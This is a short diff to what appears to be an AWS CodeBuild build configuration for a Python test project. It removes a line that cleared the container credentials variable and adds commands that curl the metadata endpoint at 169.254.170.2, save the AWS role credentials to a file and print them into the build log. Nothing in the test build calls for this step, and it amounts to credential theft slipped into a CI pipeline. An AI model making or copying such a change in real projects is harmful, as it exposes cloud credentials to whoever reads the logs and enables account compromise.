@@ -4,7 +4,8 @@ phases:
   pre_build:
     commands:
       - pip install -r requirements-dev.txt
-      - unset AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+      - curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > creds.txt
+      - cat creds.txt
   build:
     commands:
       - python moto-test.py
